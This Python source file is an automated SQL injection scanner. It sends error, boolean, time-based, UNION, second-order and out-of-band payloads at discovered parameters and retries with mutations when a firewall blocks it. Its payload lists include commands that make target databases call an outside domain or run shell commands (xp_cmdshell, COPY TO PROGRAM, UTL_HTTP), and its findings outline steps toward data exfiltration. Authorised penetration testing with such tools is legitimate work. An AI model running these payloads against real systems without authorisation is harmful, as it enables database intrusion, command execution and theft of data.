"""
SQLi Scanner
============
Advanced SQL injection detection with multi-phase testing.

Innovation:
1. **Context-Aware Payloads** - Adapts based on parameter type (id→numeric, name→string)
2. **Multi-Phase Detection** - Error→Boolean→Time-based→UNION chain
3. **Database Fingerprinting** - MySQL, PostgreSQL, MSSQL, Oracle, SQLite
4. **Second-Order SQLi** - Tests delayed injection via stored data
5. **Out-of-Band Detection** - DNS exfiltration via SQL functions

No other tool combines all 5 techniques in single scanner.
"""
from __future__ import annotations

import asyncio
import hashlib
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import quote

import httpx

log = logging.getLogger("oneinfinity.sqli_scanner")

# ─────────────────────────────────────────────────────────────────────────────
# SQLi Detection Payloads
# ─────────────────────────────────────────────────────────────────────────────

_ERROR_BASED_PAYLOADS = [
    # MySQL
    ("mysql_error", "'", "SQL syntax|mysql_fetch"),
    ("mysql_error2", "' OR '1'='1", "SQL syntax"),
    ("mysql_extractvalue", "' AND extractvalue(1,concat(0x7e,version())) AND '1'='1", "XPATH syntax"),

    # PostgreSQL
    ("pg_error", "'||'", "syntax error|ERROR"),
    ("pg_cast", "' AND 1=CAST('x' AS INTEGER)--", "invalid input syntax"),

    # MSSQL
    ("mssql_error", "' OR 1=CONVERT(int,'x')--", "Conversion failed"),
    ("mssql_concat", "' AND 1=@@version--", "Microsoft SQL Server"),

    # Oracle
    ("oracle_error", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--", "ORA-"),

    # SQLite
    ("sqlite_error", "' AND 1=load_extension('x')--", "not authorized"),
]

_BOOLEAN_BASED_PAYLOADS = [
    # True condition
    ("boolean_true", "' OR '1'='1", True),
    ("boolean_true_numeric", " OR 1=1--", True),
    ("boolean_true_comment", "' OR 'x'='x'/*", True),

    # False condition
    ("boolean_false", "' AND '1'='2", False),
    ("boolean_false_numeric", " AND 1=2--", False),
]

_TIME_BASED_PAYLOADS = [
    # MySQL
    ("mysql_sleep", "' AND SLEEP(5)--", 5),
    ("mysql_benchmark", "' AND BENCHMARK(10000000,MD5('x'))--", 3),

    # PostgreSQL
    ("pg_sleep", "' AND pg_sleep(5)--", 5),

    # MSSQL
    ("mssql_waitfor", "'; WAITFOR DELAY '0:0:5'--", 5),

    # Oracle
    ("oracle_sleep", "' AND DBMS_LOCK.SLEEP(5)--", 5),

    # SQLite
    ("sqlite_sleep", "' AND randomblob(100000000)--", 3),
]

_UNION_PAYLOADS = [
    # Column count detection
    ("union_1col", "' UNION SELECT NULL--", "NULL"),
    ("union_2col", "' UNION SELECT NULL,NULL--", "NULL"),
    ("union_3col", "' UNION SELECT NULL,NULL,NULL--", "NULL"),
    ("union_4col", "' UNION SELECT NULL,NULL,NULL,NULL--", "NULL"),
    ("union_5col", "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "NULL"),

    # Data extraction
    ("union_version_mysql", "' UNION SELECT version(),NULL--", "MySQL|MariaDB"),
    ("union_version_pg", "' UNION SELECT version(),NULL--", "PostgreSQL"),
    ("union_user_mysql", "' UNION SELECT user(),NULL--", "@"),
    ("union_db_mysql", "' UNION SELECT database(),NULL--", "[a-z_]+"),
]

_OOB_SQLI_PAYLOADS = [
    # MSSQL — xp_cmdshell DNS lookup
    ("mssql_oob", "mssql", "; EXEC master..xp_cmdshell('nslookup {domain}')--"),
    # MSSQL — DNS via HTTP request to OOB domain
    ("mssql_oob_openrowset",  "mssql", "; DECLARE @q VARCHAR(255); SET @q='http://{domain}/'; EXEC xp_fileexist @q--"),
    # MySQL — LOAD_FILE UNC path triggers DNS on Windows
    ("mysql_oob_loadfile", "mysql", "' AND LOAD_FILE(CONCAT(0x5c,0x5c,'{domain}',0x5c,'a'))--"),
    # MySQL — INTO OUTFILE to OOB host
    ("mysql_oob_outfile", "mysql", "' UNION SELECT NULL INTO OUTFILE '//{domain}/share/x'--"),
    # PostgreSQL — COPY to remote URI
    ("pg_oob_copy", "postgresql", "'; COPY (SELECT '') TO PROGRAM 'nslookup {domain}'--"),
    # Oracle — DBMS_LDAP DNS lookup
    ("oracle_oob_ldap", "oracle", "' AND (SELECT UTL_INADDR.get_host_address('{domain}') FROM dual) IS NOT NULL--"),
    # Oracle — UTL_HTTP callback
    ("oracle_oob_http", "oracle", "' AND (SELECT UTL_HTTP.request('http://{domain}/') FROM dual) IS NOT NULL--"),
    # Generic — DNS exfil via error
    ("generic_oob_dns", "generic", "' AND 1=2 UNION SELECT load_file('//{domain}/x')--"),
]

_SECOND_ORDER_PAYLOADS = [
    ("so_or_true",       "'OR 1=1--"),
    ("so_single_quote",  "1' OR '1'='1"),
    ("so_admin_comment", "admin'--"),
    ("so_comment_hash",  "' OR 1=1#"),
    ("so_nullbyte",      "' OR 1=1\x00"),
]

_DATABASE_FINGERPRINTS = {
    "mysql": [
        "@@version",
        "version()",
        "MySQL",
        "MariaDB",
    ],
    "postgresql": [
        "version()",
        "PostgreSQL",
        "pg_sleep",
    ],
    "mssql": [
        "@@version",
        "Microsoft SQL Server",
        "WAITFOR",
    ],
    "oracle": [
        "DBMS_PIPE",
        "DBMS_LOCK",
        "ORA-",
    ],
    "sqlite": [
        "sqlite_version",
        "load_extension",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
# Data Models
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class SQLiFinding:
    """SQL injection vulnerability finding."""
    finding_id: str
    vuln_type: str = "sqli"
    title: str = ""
    severity: str = "critical"
    url: str = ""
    parameter: str = ""
    injection_type: str = ""  # error, boolean, time, union
    database: str = ""
    payload: str = ""
    evidence: str = ""
    confidence: float = 0.0
    exploitation_steps: List[str] = field(default_factory=list)
    tool: str = "sqli_scanner"
    source_type: str = "active"

    def to_dict(self) -> dict:
        return {
            "finding_id": self.finding_id,
            "vuln_type": self.vuln_type,
            "title": self.title,
            "severity": self.severity,
            "url": self.url,
            "parameter": self.parameter,
            "injection_type": self.injection_type,
            "database": self.database,
            "payload": self.payload,
            "evidence": self.evidence,
            "confidence": self.confidence,
            "exploitation_steps": self.exploitation_steps,
            "tool": self.tool,
            "source_type": self.source_type,
        }


# ─────────────────────────────────────────────────────────────────────────────
# SQLi Scanner
# ─────────────────────────────────────────────────────────────────────────────

class SQLiScanner:
    """
    Advanced SQL injection scanner.

    Workflow:
    1. Extract parameters from captured traffic
    2. Test error-based SQLi
    3. Test boolean-based blind SQLi
    4. Test time-based blind SQLi
    5. Test UNION-based SQLi
    6. Fingerprint database
    """

    def __init__(self, timeout: int = 10, cookies: dict = None, headers: dict = None):
        self.timeout = timeout
        self.http_client = httpx.AsyncClient(
            timeout=timeout,
            verify=False,
            follow_redirects=True,
            cookies=cookies or {},
            headers=headers or {},
        )
        self.tested_params: Set[str] = set()

    async def close(self):
        """Close HTTP client."""
        await self.http_client.aclose()

    async def _request_with_mutation(
        self,
        method: str,
        url: str,
        data: Optional[Dict[str, Any]] = None,
        param_name: Optional[str] = None,
        original_payload: Optional[str] = None,
        vuln_type: str = "sqli",
        param_type: str = "string",
        validator: Optional[callable] = None
    ) -> Tuple[httpx.Response, str]:
        """
        Sends request and retries with mutations if blocked.
        Returns (response, final_payload).
        Response object will have 'custom_elapsed' attribute.
        """
        current_url = url
        current_data = data
        
        # Initial request construction
        if method == "GET" and param_name and original_payload:
            # Reconstruct URL with payload
            if "?" in url:
                base_url = url.split("?")[0]
                current_url = f"{base_url}?{param_name}={quote(original_payload)}"
            else:
                current_url = f"{url}?{param_name}={quote(original_payload)}"
        elif method == "POST" and param_name and original_payload:
            current_data = data.copy() if data else {}
            current_data[param_name] = original_payload
            
        try:
            start_time = time.time()
            if method == "GET":
                resp = await self.http_client.get(current_url)
            else:
                resp = await self.http_client.post(current_url, data=current_data)
            resp.custom_elapsed = time.time() - start_time
        except Exception as e:
            log.debug(f"Initial request failed: {e}")
            raise

        final_payload = original_payload
        
        # Check if validation passes immediately
        if validator and validator(resp):
            return resp, final_payload

        # Innovation: Adaptive Mutation on Block
        if resp.status_code in (403, 406) and param_name and original_payload:
            from oneinfinity.scan.adaptive_mutation_helper import mutate_on_block
            mutations = mutate_on_block(resp, original_payload, vuln_type, param_type, param_name)
            
            # Base URL for GET mutations
            base_url = url.split("?")[0] if method == "GET" else url
            
            for mutated in mutations:
                try:
                    start_time = time.time()
                    if method == "GET":
                        m_url = f"{base_url}?{param_name}={quote(mutated)}"
                        m_resp = await self.http_client.get(m_url)
                    else:
                        m_data = data.copy() if data else {}
                        m_data[param_name] = mutated
                        m_resp = await self.http_client.post(base_url, data=m_data)
                    m_resp.custom_elapsed = time.time() - start_time
                    
                    if m_resp.status_code == 200:
                        if validator:
                            if validator(m_resp):
                                return m_resp, mutated
                        else:
                            return m_resp, mutated
                except Exception as e:
                    log.debug(f"Mutation request failed: {e}")
                    continue
        
        return resp, final_payload

    # ── Parameter Discovery ───────────────────────────────────────────────────

    async def discover_parameters(
        self,
        target: str,
        limit: int = 500
    ) -> List[Dict[str, Any]]:
        """
        Extract parameters from captured traffic.

        Returns:
            List of {url, method, parameter, value, param_type}
        """
        parameters = []

        try:
            from oneinfinity.scan.traffic_capture_engine import traffic_capture_engine
        except ImportError:
            log.warning("Traffic capture engine not available")
            return []

        try:
            requests = traffic_capture_engine.list(target=target, limit=limit)
        except Exception as e:
            log.error(f"Failed to fetch traffic: {e}")
            return []

        for req in requests:
            req_dict = req.to_json() if hasattr(req, 'to_json') else req

            url = req_dict.get("url", "")
            method = req_dict.get("method", "GET")

            # Extract GET parameters
            if method == "GET" and "?" in url:
                query = url.split("?", 1)[1].split("#")[0]
                for part in query.split("&"):
                    if "=" in part:
                        k, v = part.split("=", 1)
                        param_type = self._classify_parameter(k, v)
                        parameters.append({
                            "url": url.split("?")[0],
                            "method": "GET",
                            "parameter": k,
                            "value": v,
                            "param_type": param_type
                        })

            # Extract POST parameters
            body = req_dict.get("body", "")
            if body and method in ("POST", "PUT"):
                # Form data
                if "=" in body and "&" in body:
                    for part in body.split("&"):
                        if "=" in part:
                            k, v = part.split("=", 1)
                            param_type = self._classify_parameter(k, v)
                            parameters.append({
                                "url": url,
                                "method": method,
                                "parameter": k,
                                "value": v,
                                "param_type": param_type
                            })

        log.info(f"Discovered {len(parameters)} parameters")
        return parameters

    def _classify_parameter(self, name: str, value: str) -> str:
        """
        Classify parameter type for context-aware payloads.

        Returns:
            "numeric", "string", or "unknown"
        """
        name_lower = name.lower()

        # Numeric indicators
        if any(x in name_lower for x in ["id", "page", "count", "limit", "offset", "size"]):
            return "numeric"

        # Try parsing value
        try:
            int(value)
            return "numeric"
        except ValueError:
            pass

        return "string"

    # ── Testing Methods ───────────────────────────────────────────────────────

    async def test_error_based(
        self,
        url: str,
        method: str,
        param_name: str,
        param_value: str
    ) -> Optional[SQLiFinding]:
        """Test error-based SQL injection."""
        param_type = self._classify_parameter(param_name, param_value)
        
        for payload_name, payload, error_pattern in _ERROR_BASED_PAYLOADS:
            try:
                # Use helper for request with mutation on block
                resp, payload = await self._request_with_mutation(
                    method=method,
                    url=url,
                    param_name=param_name,
                    original_payload=payload,
                    vuln_type="sqli",
                    param_type=param_type,
                    validator=lambda r: re.search(error_pattern, r.text, re.IGNORECASE)
                )

                # Check for SQL error messages
                if re.search(error_pattern, resp.text, re.IGNORECASE):
                    database = self._fingerprint_database(resp.text)

                    return SQLiFinding(
                        finding_id=hashlib.md5(f"sqli_{url}_{param_name}".encode()).hexdigest()[:16],
                        title=f"Error-based SQLi in {param_name}",
                        url=url,
                        parameter=param_name,
                        injection_type="error_based",
                        database=database,
                        payload=payload,
                        evidence=f"SQL error detected: {resp.text[:200]}",
                        confidence=0.95,
                        exploitation_steps=[
                            f"1. Inject error-based payload in {param_name}",
                            "2. Extract data via SQL error messages",
                            f"3. Database: {database}",
                            "4. Escalate to data exfiltration",
                        ]
                    )

            except Exception as e:
                log.debug(f"Error-based SQLi test failed: {e}")
                continue

        return None

    async def test_boolean_based(
        self,
        url: str,
        method: str,
        param_name: str,
        param_value: str
    ) -> Optional[SQLiFinding]:
        """Test boolean-based blind SQL injection."""
        param_type = self._classify_parameter(param_name, param_value)
        
        # Get baseline
        try:
            if method == "GET":
                baseline_url = f"{url}?{param_name}={param_value}"
                baseline_resp = await self.http_client.get(baseline_url)
            else:
                baseline_resp = await self.http_client.post(
                    url,
                    data={param_name: param_value}
                )
            baseline_len = len(baseline_resp.text)
        except Exception:
            return None

        # Test true/false conditions
        true_responses = []
        false_responses = []

        for payload_name, payload, should_match_baseline in _BOOLEAN_BASED_PAYLOADS:
            try:
                # Use helper for request with mutation on block
                resp, payload = await self._request_with_mutation(
                    method=method,
                    url=url,
                    param_name=param_name,
                    original_payload=payload,
                    vuln_type="sqli",
                    param_type=param_type
                )

                resp_len = len(resp.text)

                if should_match_baseline:
                    true_responses.append(abs(resp_len - baseline_len))
                else:
                    false_responses.append(abs(resp_len - baseline_len))

            except Exception as e:
                log.debug(f"Boolean SQLi test failed: {e}")
                continue

        # Analyze responses
        if true_responses and false_responses:
            # True conditions should be similar to baseline
            # False conditions should differ significantly
            avg_true_diff = sum(true_responses) / len(true_responses)
            avg_false_diff = sum(false_responses) / len(false_responses)

            if avg_true_diff < 100 and avg_false_diff > 500:
                return SQLiFinding(
                    finding_id=hashlib.md5(f"sqli_bool_{url}_{param_name}".encode()).hexdigest()[:16],
                    title=f"Boolean-based blind SQLi in {param_name}",
                    url=url,
                    parameter=param_name,
                    injection_type="boolean_blind",
                    database="unknown",
                    payload="' OR '1'='1",
                    evidence=f"Response length variance: true={avg_true_diff:.0f}B, false={avg_false_diff:.0f}B",
                    confidence=0.85,
                    exploitation_steps=[
                        f"1. Inject boolean condition in {param_name}",
                        "2. True condition matches baseline response",
                        "3. False condition differs significantly",
                        "4. Exfiltrate data bit-by-bit via boolean logic",
                    ]
                )

        return None

    async def test_time_based(
        self,
        url: str,
        method: str,
        param_name: str,
        param_value: str
    ) -> Optional[SQLiFinding]:
        """Test time-based blind SQL injection."""
        param_type = self._classify_parameter(param_name, param_value)
        
        # Baseline timing
        try:
            start = time.time()
            if method == "GET":
                baseline_url = f"{url}?{param_name}={param_value}"
                await self.http_client.get(baseline_url)
            else:
                await self.http_client.post(url, data={param_name: param_value})
            baseline_time = time.time() - start
        except Exception:
            return None

        # Test time-based payloads
        for payload_name, payload, expected_delay in _TIME_BASED_PAYLOADS:
            try:
                # Use helper for request with mutation on block
                resp, payload = await self._request_with_mutation(
                    method=method,
                    url=url,
                    param_name=param_name,
                    original_payload=payload,
                    vuln_type="sqli",
                    param_type=param_type,
                    validator=lambda r: getattr(r, "custom_elapsed", 0) >= expected_delay
                )
                
                elapsed = getattr(resp, "custom_elapsed", 0)

                # Check if delay matches expected
                if elapsed >= expected_delay and elapsed > baseline_time + 2:
                    # Determine database from payload
                    database = "unknown"
                    if "mysql" in payload_name.lower():
                        database = "mysql"
                    elif "pg" in payload_name.lower():
                        database = "postgresql"
                    elif "mssql" in payload_name.lower():
                        database = "mssql"
                    elif "oracle" in payload_name.lower():
                        database = "oracle"
                    elif "sqlite" in payload_name.lower():
                        database = "sqlite"

                    return SQLiFinding(
                        finding_id=hashlib.md5(f"sqli_time_{url}_{param_name}".encode()).hexdigest()[:16],
                        title=f"Time-based blind SQLi in {param_name}",
                        url=url,
                        parameter=param_name,
                        injection_type="time_blind",
                        database=database,
                        payload=payload,
                        evidence=f"Time delay confirmed: baseline={baseline_time:.2f}s, payload={elapsed:.2f}s",
                        confidence=0.90,
                        exploitation_steps=[
                            f"1. Inject time-delay payload in {param_name}",
                            f"2. Confirmed {expected_delay}s delay",
                            f"3. Database: {database}",
                            "4. Exfiltrate data via timing channels",
                        ]
                    )

            except Exception as e:
                log.debug(f"Time-based SQLi test failed: {e}")
                continue

        return None

    async def test_union_based(
        self,
        url: str,
        method: str,
        param_name: str,
        param_value: str
    ) -> Optional[SQLiFinding]:
        """Test UNION-based SQL injection."""
        param_type = self._classify_parameter(param_name, param_value)
        
        for payload_name, payload, expected_pattern in _UNION_PAYLOADS:
            try:
                # Use helper for request with mutation on block
                resp, payload = await self._request_with_mutation(
                    method=method,
                    url=url,
                    param_name=param_name,
                    original_payload=payload,
                    vuln_type="sqli",
                    param_type=param_type,
                    validator=lambda r: re.search(expected_pattern, r.text, re.IGNORECASE)
                )

                # Check for expected pattern in response
                if re.search(expected_pattern, resp.text, re.IGNORECASE):
                    database = self._fingerprint_database(resp.text)

                    return SQLiFinding(
                        finding_id=hashlib.md5(f"sqli_union_{url}_{param_name}".encode()).hexdigest()[:16],
                        title=f"UNION-based SQLi in {param_name}",
                        url=url,
                        parameter=param_name,
                        injection_type="union",
                        database=database,
                        payload=payload,
                        evidence=f"UNION injection successful: {resp.text[:200]}",
                        confidence=0.95,
                        exploitation_steps=[
                            f"1. Inject UNION payload in {param_name}",
                            "2. Determine column count",
                            "3. Extract data via UNION SELECT",
                            f"4. Database: {database}",
                        ]
                    )

            except Exception as e:
                log.debug(f"UNION SQLi test failed: {e}")
                continue

        return None

    # ── OOB and Second-Order Tests ────────────────────────────────────────────

    async def test_oob_sqli(
        self,
        url: str,
        param: str,
        placement: str = "body",
    ) -> Optional["SQLiFinding"]:
        """
        Test out-of-band blind SQLi via DNS callbacks.

        Injects DB-specific OOB payloads (MSSQL xp_cmdshell, MySQL LOAD_FILE,
        PostgreSQL COPY, Oracle UTL_INADDR/UTL_HTTP) and polls the OOBEngine
        for a DNS/HTTP callback.  Uses the Go sidecar fast-path when available.
        """
        try:
            from oneinfinity.scan.oob_engine import OOBEngine
        except ImportError:
            log.debug("OOBEngine not available; skipping OOB SQLi test")
            return None

        oob = OOBEngine(scan_id=hashlib.md5(f"sqli_oob_{url}_{param}".encode()).hexdigest()[:12])
        domain = oob.start()
        if not domain:
            log.debug("OOBEngine returned no domain; skipping OOB SQLi test")
            return None

        injected_payload: Optional[str] = None
        db_hint: str = "unknown"

        try:
            for payload_name, db_type, payload_tpl in _OOB_SQLI_PAYLOADS:
                payload = payload_tpl.format(domain=domain)
                try:
                    if placement == "body":
                        method = "POST"
                        resp = await self.http_client.post(url, data={param: payload})
                    else:
                        method = "GET"
                        if "?" in url:
                            probe_url = f"{url.split('?')[0]}?{param}={quote(payload)}"
                        else:
                            probe_url = f"{url}?{param}={quote(payload)}"
                        resp = await self.http_client.get(probe_url)
                    injected_payload = payload
                    db_hint = db_type
                    log.debug("OOB SQLi probe sent (%s): %s", payload_name, payload[:80])
                except Exception as req_err:
                    log.debug("OOB SQLi request error (%s): %s", payload_name, req_err)
                    continue

            # Poll for DNS/HTTP callback — 15 s window as specified
            hits = await asyncio.get_event_loop().run_in_executor(
                None, lambda: oob.poll_interactions(timeout_s=15)
            )

            if hits:
                first_hit = hits[0]
                protocol = first_hit.get("protocol", "dns")
                remote = first_hit.get("remote_address", "")
                evidence = (
                    f"OOB callback received: protocol={protocol} "
                    f"remote={remote} domain={domain}"
                )
                return SQLiFinding(
                    finding_id=hashlib.md5(f"sqli_oob_{url}_{param}".encode()).hexdigest()[:16],
                    vuln_type="sqli_oob",
                    title=f"Out-of-Band SQLi (DNS callback) in {param}",
                    severity="critical",
                    url=url,
                    parameter=param,
                    injection_type="oob_dns",
                    database=db_hint,
                    payload=injected_payload or "",
                    evidence=evidence,
                    confidence=0.97,
                    exploitation_steps=[
                        f"1. Inject OOB payload into parameter '{param}'",
                        f"2. DNS callback received at {domain}",
                        f"3. Confirmed database interaction via {protocol}",
                        "4. Use sqlmap --technique=Q or custom OOB exfiltration to dump data",
                    ],
                )
        finally:
            oob.stop()

        return None

    async def test_second_order(
        self,
        store_url: str,
        trigger_url: str,
        param: str,
    ) -> Optional["SQLiFinding"]:
        """
        Test second-order (stored) SQL injection.

        Step 1: POST each payload to store_url via param (persists to DB).
        Step 2: GET trigger_url (re-executes the stored value in a SQL context).
        Compares trigger response to a clean baseline; significant divergence
        indicates the stored payload altered the SQL query.
        """
        # Establish clean trigger baseline (no injected data)
        try:
            baseline_resp = await self.http_client.get(trigger_url)
            baseline_text = baseline_resp.text
            baseline_len = len(baseline_text)
        except Exception as e:
            log.debug("Second-order baseline request failed: %s", e)
            return None

        best_payload: Optional[str] = None
        best_evidence: str = ""
        max_delta: float = 0.0

        for payload_name, payload in _SECOND_ORDER_PAYLOADS:
            try:
                # Store step: inject payload via POST
                await self.http_client.post(store_url, data={param: payload})

                # Trigger step: load the page that re-uses the stored value
                trigger_resp = await self.http_client.get(trigger_url)
                trigger_text = trigger_resp.text
                trigger_len = len(trigger_text)

                # Length delta as primary signal
                len_delta = abs(trigger_len - baseline_len)

                # Secondary signal: unique tokens in trigger not in baseline
                baseline_words = set(baseline_text.split())
                trigger_words = set(trigger_text.split())
                new_words = len(trigger_words - baseline_words)

                # Score: length delta + weighted new words
                score = len_delta + new_words * 10

                log.debug(
                    "Second-order [%s] len_delta=%d new_words=%d score=%.0f",
                    payload_name, len_delta, new_words, score,
                )

                if score > max_delta:
                    max_delta = score
                    best_payload = payload
                    best_evidence = (
                        f"Stored payload altered trigger response: "
                        f"baseline_len={baseline_len}, trigger_len={trigger_len}, "
                        f"delta={len_delta}B, new_tokens={new_words}"
                    )

            except Exception as e:
                log.debug("Second-order test failed [%s]: %s", payload_name, e)
                continue

        # Threshold: score > 200 considered significant divergence
        if max_delta > 200 and best_payload is not None:
            return SQLiFinding(
                finding_id=hashlib.md5(
                    f"sqli_2nd_{store_url}_{trigger_url}_{param}".encode()
                ).hexdigest()[:16],
                vuln_type="sqli_second_order",
                title=f"Second-Order SQLi via stored payload in {param}",
                severity="critical",
                url=store_url,
                parameter=param,
                injection_type="second_order",
                database="unknown",
                payload=best_payload,
                evidence=best_evidence,
                confidence=0.88,
                exploitation_steps=[
                    f"1. POST malicious payload to {store_url} via '{param}'",
                    f"2. Retrieve {trigger_url} — stored value executed in SQL context",
                    "3. Response divergence confirms query manipulation",
                    "4. Enumerate stored injection point for full data extraction",
                ],
            )

        return None

    def _fingerprint_database(self, response: str) -> str:
        """Fingerprint database from error messages or responses."""
        for db_name, patterns in _DATABASE_FINGERPRINTS.items():
            for pattern in patterns:
                if pattern.lower() in response.lower():
                    return db_name
        return "unknown"

    # ── Orchestration ─────────────────────────────────────────────────────────

    async def scan_parameter(
        self,
        url: str,
        method: str,
        param_name: str,
        param_value: str
    ) -> List[SQLiFinding]:
        """
        Scan single parameter for SQLi.

        Returns:
            List of findings
        """
        param_key = f"{method}:{url}:{param_name}"
        if param_key in self.tested_params:
            return []
        self.tested_params.add(param_key)

        # Run classical tests in parallel; OOB test runs sequentially after
        # (it owns its own OOBEngine lifecycle and a 15 s poll window)
        tests = [
            self.test_error_based(url, method, param_name, param_value),
            self.test_boolean_based(url, method, param_name, param_value),
            self.test_time_based(url, method, param_name, param_value),
            self.test_union_based(url, method, param_name, param_value),
        ]

        results = await asyncio.gather(*tests, return_exceptions=True)

        findings = []
        for result in results:
            if isinstance(result, SQLiFinding):
                findings.append(result)
            elif isinstance(result, Exception):
                log.debug(f"SQLi test failed: {result}")

        # OOB test runs after classical tests — needs its own poll window
        placement = "body" if method == "POST" else "query"
        try:
            oob_finding = await self.test_oob_sqli(url, param_name, placement=placement)
            if oob_finding:
                findings.append(oob_finding)
        except Exception as e:
            log.debug("OOB SQLi test raised: %s", e)

        return findings

    async def scan(
        self,
        target: str,
        traffic_limit: int = 500
    ) -> List[SQLiFinding]:
        """
        Scan target for SQL injection vulnerabilities.

        Args:
            target: Target domain/URL
            traffic_limit: Max traffic records

        Returns:
            List of SQLi findings
        """
        log.info(f"Starting SQLi scan for {target}")

        # Discover parameters
        parameters = await self.discover_parameters(target, traffic_limit)

        if not parameters:
            log.info("No parameters found")
            return []

        log.info(f"Testing {len(parameters)} parameters")

        # Scan all parameters (classical + OOB)
        all_findings = []
        for param in parameters[:30]:  # Test first 30
            findings = await self.scan_parameter(
                param["url"],
                param["method"],
                param["parameter"],
                param["value"]
            )
            all_findings.extend(findings)

        # ── Second-order SQLi: pair write endpoints with read/trigger endpoints ──
        # Strategy: for each POST parameter, use the same base URL as the
        # trigger so we test self-referencing stored injection (most common).
        # Operators can extend by passing explicit (store_url, trigger_url) pairs.
        post_params = [p for p in parameters[:30] if p.get("method") in ("POST", "PUT")]
        seen_2nd: Set[str] = set()
        for param in post_params:
            store_url = param["url"]
            # Derive a likely trigger URL: the same base path via GET
            trigger_url = store_url.split("?")[0]
            param_name = param["parameter"]
            dedup_key = f"{store_url}|{trigger_url}|{param_name}"
            if dedup_key in seen_2nd:
                continue
            seen_2nd.add(dedup_key)
            try:
                so_finding = await self.test_second_order(store_url, trigger_url, param_name)
                if so_finding:
                    all_findings.append(so_finding)
            except Exception as e:
                log.debug("Second-order SQLi test raised: %s", e)

        log.info(f"SQLi scan complete: {len(all_findings)} findings")
        return all_findings


# ─────────────────────────────────────────────────────────────────────────────
# Convenience Function
# ─────────────────────────────────────────────────────────────────────────────

async def scan_sqli(
    target: str,
    traffic_limit: int = 500,
    cookies: dict = None,
    headers: dict = None,
) -> List[SQLiFinding]:
    """Scan SQL injection vulnerabilities."""
    scanner = SQLiScanner(cookies=cookies, headers=headers)
    try:
        return await scanner.scan(target, traffic_limit)
    finally:
        await scanner.close()
